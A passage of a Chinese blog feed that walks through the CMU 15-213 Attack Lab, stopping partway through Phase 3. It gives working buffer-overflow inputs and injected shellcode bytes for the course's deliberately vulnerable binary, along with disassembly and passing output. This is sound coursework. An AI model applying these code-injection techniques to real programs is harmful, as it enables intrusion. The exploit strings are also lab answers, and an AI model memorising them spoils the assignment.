<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://salvely.github.io/blog</id>
    <title>望春风 • Posts by &#34;15-213 lab&#34; category</title>
    <link href="https://salvely.github.io/blog" />
    <updated>2024-02-29T02:36:22.000Z</updated>
    <category term="C++" />
    <category term="Arch" />
    <category term="Linux" />
    <category term="安装教程" />
    <category term="操作系统" />
    <category term="notes" />
    <category term="配置教程" />
    <category term="Debian" />
    <category term="包管理" />
    <category term="参考资料" />
    <category term="CMake" />
    <category term="Makefile" />
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</id>
        <title>15213 Lab 3-Attack lab 实验记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
        <content type="html">&lt;h2 id=&#34;准备工作&#34;&gt;&lt;a href=&#34;#准备工作&#34; class=&#34;headerlink&#34; title=&#34;准备工作&#34;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;p&gt;文件夹中的几个重要文件如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cookie.txt: 8 个 16 进制数字的码，用于唯一标记&lt;/li&gt;
&lt;li&gt;ctarget: 准备用于 code injection attack&lt;/li&gt;
&lt;li&gt;farm.c: 用于 return oriented programming attacks&lt;/li&gt;
&lt;li&gt;hex2raw: 用于生成攻击的二进制文件&lt;/li&gt;
&lt;li&gt;README.txt: 介绍了文件夹中文件的内容&lt;/li&gt;
&lt;li&gt;rtarget: 准备用于 return oriented programming attacks&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实验分为 5 个 phase，其中 Phase 1 到 phase 3 是使用 code injection attack，phase 4-5 使用 return oriented programming attack。&lt;/p&gt;
&lt;h2 id=&#34;Part-I-Code-Injection-Attack&#34;&gt;&lt;a href=&#34;#Part-I-Code-Injection-Attack&#34; class=&#34;headerlink&#34; title=&#34;Part I: Code Injection Attack&#34;&gt;&lt;/a&gt;Part I: Code Injection Attack&lt;/h2&gt;&lt;h3 id=&#34;Phase-1：覆盖返回地址&#34;&gt;&lt;a href=&#34;#Phase-1：覆盖返回地址&#34; class=&#34;headerlink&#34; title=&#34;Phase 1：覆盖返回地址&#34;&gt;&lt;/a&gt;Phase 1：覆盖返回地址&lt;/h3&gt;&lt;p&gt;在这个 phase 中，我们需要引导 ctarget 中的&lt;code&gt;test&lt;/code&gt;函数返回到&lt;code&gt;touch1&lt;/code&gt;函数。首先我们对&lt;code&gt;ctarget&lt;/code&gt;做反汇编。其中&lt;code&gt;test&lt;/code&gt;函数的汇编代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401968 &amp;lt;test&amp;gt;:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 &amp;lt;getbuf&amp;gt;
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 &amp;lt;__printf_chk@plt&amp;gt;
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而&lt;code&gt;touch1&lt;/code&gt;函数的地址是&lt;code&gt;0x4017c0&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在这其中我们调用&lt;code&gt;getbuf&lt;/code&gt;函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是&lt;code&gt;0x401976&lt;/code&gt;，我们需要将其换成&lt;code&gt;0x4017c0&lt;/code&gt;。我们现在对&lt;code&gt;getbuf&lt;/code&gt;进行反汇编(nop 指令省去)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004017a8 &amp;lt;getbuf&amp;gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &amp;lt;Gets&amp;gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对该过程进行分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;留出 40 个字节的位置&lt;/li&gt;
&lt;li&gt;rdi &amp;#x3D; rsp&lt;/li&gt;
&lt;li&gt;调用 gets 函数&lt;/li&gt;
&lt;li&gt;eax &amp;#x3D; 1&lt;/li&gt;
&lt;li&gt;恢复栈空间&lt;/li&gt;
&lt;li&gt;返回&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;要完成这个实验，我们需要直到几个值：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;buf 的位置: 应该进入&lt;code&gt;getbuf&lt;/code&gt;后，&lt;code&gt;%rsp - 40&lt;/code&gt;之后的位置&lt;/li&gt;
&lt;li&gt;返回地址在栈中位置: 在调用&lt;code&gt;callq&lt;/code&gt;函数时，我们会将&lt;code&gt;%rsp - 8&lt;/code&gt;，然后将返回地址压入，然后将&lt;code&gt;%rip&lt;/code&gt;设置为&lt;code&gt;getbuf&lt;/code&gt;函数的地址。（同理，调用&lt;code&gt;retq&lt;/code&gt;的时候，我们会把栈顶的地址赋给&lt;code&gt;%rip&lt;/code&gt;，然后让&lt;code&gt;%rsp + 8&lt;/code&gt;，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完&lt;code&gt;callq&lt;/code&gt;之后&lt;code&gt;%rsp&lt;/code&gt;的位置。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;touch1&lt;/code&gt;函数的地址:&lt;code&gt;0x4017c0&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a,那个是换行符）。因为是小端法，最后 8 个字节应该是&lt;code&gt;0xc0 0x17 0x40&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;该阶段输入内容存储在&lt;code&gt;phase1.txt&lt;/code&gt;中，内容如下：&lt;code&gt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40&lt;/code&gt;。输入命令&lt;code&gt;./hex2raw &amp;lt; phase1.txt | ./ctarget -q&lt;/code&gt;进行测试(&lt;code&gt;-q&lt;/code&gt;是指运行在本地电脑上)，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功！&lt;/p&gt;
&lt;h3 id=&#34;Phase-2：在-buf-中插入攻击代码并覆盖返回地址&#34;&gt;&lt;a href=&#34;#Phase-2：在-buf-中插入攻击代码并覆盖返回地址&#34; class=&#34;headerlink&#34; title=&#34;Phase 2：在 buf 中插入攻击代码并覆盖返回地址&#34;&gt;&lt;/a&gt;Phase 2：在 buf 中插入攻击代码并覆盖返回地址&lt;/h3&gt;&lt;p&gt;在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让&lt;code&gt;test&lt;/code&gt;函数返回到&lt;code&gt;touch2&lt;/code&gt;，而且我们需要让&lt;code&gt;val&lt;/code&gt;的值等于&lt;code&gt;cookie&lt;/code&gt;的值。（而且这里我们不能直接让&lt;code&gt;test&lt;/code&gt;返回到打印&lt;code&gt;Touch2!&lt;/code&gt;那一句，因为前面有&lt;code&gt;vlevel = 2&lt;/code&gt;，后面需要验证这个值是不是 2，如果直接跳到那一句的话，&lt;code&gt;vlevel&lt;/code&gt;没有赋值，也肯定不等于 2，验证就会失败）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch2&lt;/code&gt;的函数源码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;void touch2(unsigned val)
&amp;#123;
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) &amp;#123;
        printf(&amp;quot;Touch2!: You called touch2(0x%.8x)\n&amp;quot;, val);
        validate(2);
    &amp;#125; else &amp;#123;
        printf(&amp;quot;Misfire: You called touch2(0x%.8x)\n&amp;quot;, val);
        fail(2);
    &amp;#125;
    exit(0);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;touch2&lt;/code&gt;的汇编函数如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004017ec &amp;lt;touch2&amp;gt;:
seg1:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &amp;lt;vlevel&amp;gt;
  4017f9:	00 00 00
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &amp;lt;cookie&amp;gt;
  401802:	75 20                	jne    401824 &amp;lt;touch2+0x38&amp;gt;
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 &amp;lt;__printf_chk@plt&amp;gt;
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d &amp;lt;validate&amp;gt;
  401822:	eb 1e                	jmp    401842 &amp;lt;touch2+0x56&amp;gt;
seg2:
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 &amp;lt;__printf_chk@plt&amp;gt;
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f &amp;lt;fail&amp;gt;
seg3:
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 &amp;lt;exit@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从上述汇编代码可以看出，&lt;code&gt;val&lt;/code&gt;的值在最开始存在&lt;code&gt;edi&lt;/code&gt;处。那么我们的目的就是让这个值等于&lt;code&gt;cookie&lt;/code&gt;。而且&lt;code&gt;cookie&lt;/code&gt;的位置是&lt;code&gt;6044e4&lt;/code&gt;。所以我们的目的是让&lt;code&gt;%edi&lt;/code&gt;寄存器的值等于&lt;code&gt;6044e4&lt;/code&gt;处的值。&lt;/p&gt;
&lt;p&gt;要实现攻击，我们的 buffer overflow 必须完成四步动作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让 return address 等于 buf 的开头&lt;/li&gt;
&lt;li&gt;在 buf 开头插入赋值语句，让&lt;code&gt;%edi = *0x6044e4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;让 return address &amp;#x3D; touch2 的入口地址(&lt;code&gt;0x4017ec&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;ret&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后&lt;code&gt;%rsp&lt;/code&gt;在哪里。&lt;br&gt;我们着重观察 3 个地方的&lt;code&gt;$rsp&lt;/code&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;调用&lt;code&gt;getbuf&lt;/code&gt;之前: 0x5561dca8&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;getbuf&lt;/code&gt;之后: 0x5561dca0&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;rsp = rsp - 40&lt;/code&gt;之后: 0x5561dc78&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么我们可以判断 buf 的起始位置是&lt;code&gt;0x5561dc78&lt;/code&gt;，返回地址的位置在其后 40 个字节处，也就是&lt;code&gt;0x5561dca0&lt;/code&gt;。那么我们需要让 return address(buf 最后 8 个字节)的值等于&lt;code&gt;0x5561dc78&lt;/code&gt;。换成小端序就是&lt;code&gt;0x78 0xdc 0x61 0x55&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;第二条要生成的指令应该是:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movl $0x6044e4,%eax
movl (%eax),%edi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第三条要生成的指令应该是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;subq $0x8,%rsp
movl 0x4017ec,($rsp)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后一条插入的指令是&lt;code&gt;ret&lt;/code&gt;，在这个过程中，&lt;code&gt;%rsp&lt;/code&gt;处的内容会被赋值给&lt;code&gt;%rip&lt;/code&gt;，&lt;code&gt;%rsp&lt;/code&gt;会自动加上 8。&lt;/p&gt;
&lt;p&gt;最后插入数条&lt;code&gt;nop&lt;/code&gt;指令实现 PC 的顺序累加。&lt;/p&gt;
&lt;p&gt;由于这些指令在 Appendix A 表格中没有，所以我们需要手动生成。我们将如下内容保存在文件中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    movl $0x6044e4,%eax
    movl (%eax),%edi
    subq $0x8,%rsp
    movl $0x4017ec,(%rsp)
    ret
    nop
    nop
    nop
    nop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后使用&lt;code&gt;gcc -c ph2.s&lt;/code&gt;生成&lt;code&gt;ph2.o&lt;/code&gt;文件，然后使用&lt;code&gt;objdump -d ph2.o &amp;gt; ph2.d&lt;/code&gt;，打开&lt;code&gt;ph2.d&lt;/code&gt;，有如下内容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
ph2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:	b8 e4 44 60 00       	mov    $0x6044e4,%eax
   5:	67 8b 38             	mov    (%eax),%edi
   8:	48 83 ec 08          	sub    $0x8,%rsp
   c:	c7 04 24 ec 17 40 00 	movl   $0x4017ec,(%rsp)
  13:	c3                   	retq
  14:	90                   	nop
  15:	90                   	nop
  16:	90                   	nop
  17:	90                   	nop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么我们所需要的字节就是&lt;code&gt;b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3&lt;/code&gt;，共 20 字节。后续再插入 20 个字节的&lt;code&gt;nop&lt;/code&gt;(0x90)&lt;/p&gt;
&lt;p&gt;完整的字符串是&lt;code&gt;b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55&lt;/code&gt;，我将其保存在&lt;code&gt;phase2.txt&lt;/code&gt;中。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：一开始把&lt;code&gt;0x5561dc78&lt;/code&gt;打成了&lt;code&gt;0x5564dc78&lt;/code&gt;导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。&lt;/p&gt;
&lt;p&gt;此外，注入代码的时候需要手动添加&lt;code&gt;ret&lt;/code&gt;指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:B8 E4 44 60 00 67 8B 38 48 83 EC 08 C7 04 24 EC 17 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功！&lt;/p&gt;
&lt;h3 id=&#34;Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址&#34;&gt;&lt;a href=&#34;#Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址&#34; class=&#34;headerlink&#34; title=&#34;Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址&#34;&gt;&lt;/a&gt;Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址&lt;/h3&gt;&lt;p&gt;在 phase 3 中，我们需要让程序在&lt;code&gt;getbuf&lt;/code&gt;后，运行&lt;code&gt;touch3&lt;/code&gt;函数，其注入方式和 phase 2 类似。（此处需要利用&lt;code&gt;vlevel = 3&lt;/code&gt;进行跳转后验证，因此和上次一样，我们不能直接跳转到&lt;code&gt;Touch3!&lt;/code&gt;语句，还是需要注入代码，将&lt;code&gt;%rdi&lt;/code&gt;设置为&lt;code&gt;cookie&lt;/code&gt;的值，然后再引导程序跳转到&lt;code&gt;touch3&lt;/code&gt;的开头语句）。&lt;code&gt;touch3&lt;/code&gt;函数的 C 语言版本如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
&amp;#123;
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, &amp;quot;%.8x&amp;quot;, val);
    return strncmp(sval, s, 9) == 0;
&amp;#125;

void touch3(char *sval)
&amp;#123;
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) &amp;#123;
        printf(&amp;quot;Touch3!: You called touch3(&amp;quot;%s&amp;quot;)\n&amp;quot;, sval);
        validate(3);
    &amp;#125; else &amp;#123;
        printf(&amp;quot;Misfire: You called touch3(&amp;quot;%s&amp;quot;)\n&amp;quot;, sval);
        fail(3);
    &amp;#125;
    exit(0);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;一开始的错误解答&#34;&gt;&lt;a href=&#34;#一开始的错误解答&#34; class=&#34;headerlink&#34; title=&#34;一开始的错误解答&#34;&gt;&lt;/a&gt;一开始的错误解答&lt;/h4&gt;&lt;p&gt;这里的差别在于我们输入的&lt;code&gt;string&lt;/code&gt;是一个&lt;code&gt;cookie&lt;/code&gt;的字符串表示。我们对&lt;code&gt;touch3&lt;/code&gt;做反汇编看看&lt;code&gt;cookie&lt;/code&gt;的字符串表示存在哪里？&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   0x000000000040190b &amp;lt;+17&amp;gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &amp;lt;cookie&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们输入&lt;code&gt;x/s 0x6044e4&lt;/code&gt;看看结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x6044e4
0x6044e4 &amp;lt;cookie&amp;gt;:      &amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里同样，可以看出来和上一次的&lt;code&gt;cookie&lt;/code&gt;放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值&lt;code&gt;%rdi&lt;/code&gt;设置为&lt;code&gt;0x6044e4&lt;/code&gt;位置的值。而这次&lt;code&gt;%rdi&lt;/code&gt;指向输入的字符串，我们需要做的是将&lt;code&gt;%rdi&lt;/code&gt;设置为&lt;code&gt;0x6044e4&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;此外，&lt;code&gt;touch3&lt;/code&gt;的入口地址为&lt;code&gt;0x4018fa&lt;/code&gt;。因此在最后需要让 return address 等于这个值。&lt;/p&gt;
&lt;p&gt;那么总体的注入和上次遵循一样的步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让 return address 等于 buf 的开头(&lt;code&gt;0x5561dc78&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;在 buf 开头插入赋值语句，让&lt;code&gt;%edi = 0x6044e4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;让 return address &amp;#x3D; touch3 的入口地址(&lt;code&gt;0x4018fa&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;ret&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;综上，这次的调用语句是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    movl $0x6044e4,%edi
    subq $0x8,%rsp
    movl $0x4018fa,(%rsp)
    ret
    nop
    nop
    nop
    nop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将其保存在&lt;code&gt;ph3.s&lt;/code&gt;中，输入&lt;code&gt;gcc -c ph3.s&lt;/code&gt;生成&lt;code&gt;ph3.o&lt;/code&gt;文件，再&lt;code&gt;objdump -d ph3.o &amp;gt; ph3.d&lt;/code&gt;，生成&lt;code&gt;ph3.d&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
ph3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:	bf e4 44 60 00       	mov    $0x6044e4,%edi
   5:	48 83 ec 08          	sub    $0x8,%rsp
   9:	c7 04 24 fa 18 40 00 	movl   $0x4018fa,(%rsp)
  10:	c3                   	retq
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么其一直到&lt;code&gt;ret&lt;/code&gt;的字节即为&lt;code&gt;bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3&lt;/code&gt;。一共 17 个字节。将其字节复制到&lt;code&gt;phase3.txt&lt;/code&gt;的最前面。添加 23 个&lt;code&gt;nop&lt;/code&gt;(&lt;code&gt;0x90&lt;/code&gt;)凑齐 40 个字节，最后 8 个字节的值必须等于&lt;code&gt;0x5561dc78&lt;/code&gt;。换成小端序就是&lt;code&gt;0x78 0xdc 0x61 0x55&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;完整字符串如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入&lt;code&gt;./hex2raw &amp;lt; phase3.txt | ./ctarget &lt;/code&gt;。结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;Cookie: 0x59b997fa
Type string:Misfire: You called touch3(&amp;quot;���Y&amp;quot;)
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后确实跳转到了&lt;code&gt;touch3&lt;/code&gt;，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽)&lt;/p&gt;
&lt;h4 id=&#34;忽略随机栈空间的不正确解答&#34;&gt;&lt;a href=&#34;#忽略随机栈空间的不正确解答&#34; class=&#34;headerlink&#34; title=&#34;忽略随机栈空间的不正确解答&#34;&gt;&lt;/a&gt;忽略随机栈空间的不正确解答&lt;/h4&gt;&lt;p&gt;我们最早是认为，应该让&lt;code&gt;%edi&lt;/code&gt;指向&lt;code&gt;0x6044e4&lt;/code&gt;，也就是&lt;code&gt;cookie&lt;/code&gt;字符串所在的位置，来让&lt;code&gt;%edi&lt;/code&gt;和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，&lt;code&gt;cookie&lt;/code&gt;不是个字符串，还是个&lt;code&gt;unsigned&lt;/code&gt;类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让&lt;code&gt;输入的字符串&lt;/code&gt;和&lt;code&gt;打印出来的 cookie 的值&lt;/code&gt;相同。所以这里不能让&lt;code&gt;%rdi&lt;/code&gt;指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给&lt;code&gt;%rdi&lt;/code&gt;，然后让&lt;code&gt;%rdi&lt;/code&gt;和&lt;code&gt;cookie&lt;/code&gt;的打印版进行比较。&lt;/p&gt;
&lt;p&gt;那么&lt;code&gt;cookie&lt;/code&gt;的值是多少？我们使用&lt;code&gt;p /x cookie&lt;/code&gt;命令打印一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p /x cookie
$4 = 0x59b997fa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以输入的字符串应该是&lt;code&gt;0x59b997fa&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;经过阅读 attacklab.pdf，作者给出了以下几个提示：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x）&lt;/li&gt;
&lt;li&gt;字符串最后应该有个 0，输入&lt;code&gt;man ascii&lt;/code&gt;在 Linux 中查找 ascii 表&lt;/li&gt;
&lt;li&gt;攻击代码应该让&lt;code&gt;%rdi&lt;/code&gt;的值等于这个字符串的起始地址&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hexmatch&lt;/code&gt;和&lt;code&gt;strncmp&lt;/code&gt;可能会覆盖一部分&lt;code&gt;getbuf&lt;/code&gt;中的 buf，注意不要让你的攻击字符串被覆盖掉。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么初始的准备工作应该是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定插入字符串和攻击代码的有效区域，防止被&lt;code&gt;hexmatch&lt;/code&gt;和&lt;code&gt;strncmp&lt;/code&gt;影响到&lt;/li&gt;
&lt;li&gt;查找&lt;code&gt;cookie&lt;/code&gt;字符串的编码，加上一个&lt;code&gt;\0&lt;/code&gt;，并插入到攻击代码之前&lt;/li&gt;
&lt;li&gt;确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在攻击代码中所做的工作应该是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让&lt;code&gt;%rdi = 插入字符串的起始位置&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;touch3&lt;/code&gt;的起始位置插入到返回地址处&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;ret&lt;/code&gt;返回&lt;/li&gt;
&lt;li&gt;通过多个&lt;code&gt;nop&lt;/code&gt;填充字符串（也可以不填充？）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们首先确定&lt;code&gt;getbuf&lt;/code&gt;的&lt;code&gt;buf&lt;/code&gt;范围，&lt;code&gt;hexmatch&lt;/code&gt;的辐射范围和&lt;code&gt;strncmp&lt;/code&gt;的辐射范围。&lt;/p&gt;
&lt;p&gt;通过&lt;a href=&#34;#phase-2%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80&#34;&gt;前文&lt;/a&gt;我们分析过：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;调用&lt;code&gt;getbuf&lt;/code&gt;之前: &lt;code&gt;0x5561dca8&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;getbuf&lt;/code&gt;之后: &lt;code&gt;0x5561dca0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;rsp = rsp - 40&lt;/code&gt;之后: &lt;code&gt;0x5561dc78&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以了解到&lt;code&gt;buf&lt;/code&gt;的范围是：&lt;code&gt;0x5561dc78 ~ 0x5561dc9f&lt;/code&gt;，&lt;code&gt;buf&lt;/code&gt;后 8 个字节的返回地址的位置是&lt;code&gt;0x5561dca0&lt;/code&gt;。&lt;/p&gt;
